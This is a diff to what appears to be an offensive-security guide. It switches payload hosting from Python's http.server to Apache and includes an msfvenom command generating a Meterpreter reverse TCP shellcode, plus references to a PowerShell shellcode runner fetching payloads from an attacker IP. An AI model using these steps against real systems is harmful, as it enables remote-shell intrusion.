@@ -16,7 +16,8 @@ $PayloadUrl = "http://<IP>/payload.ps1"
 
 **2. Host your payload on your HTTP server:**
 ```bash
-python3 -m http.server 80
+sudo systemctl start apache2
+sudo cp payload.ps1 /var/www/html/
 ```
 
 **3. Start your listener:**
@@ -46,7 +47,8 @@ A full stageless Meterpreter payload is ~200KB, so download it at runtime instea
 **1. Generate the shellcode and host it:**
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f raw -o /tmp/sc.bin
-python3 -m http.server 80        # serve /tmp/sc.bin from this directory
+sudo systemctl start apache2
+sudo cp /tmp/sc.bin /var/www/html/      # serve /tmp/sc.bin
 ```
 
 **2. Point `$buf` at it in `ps-shellcode-runner.ps1`:**
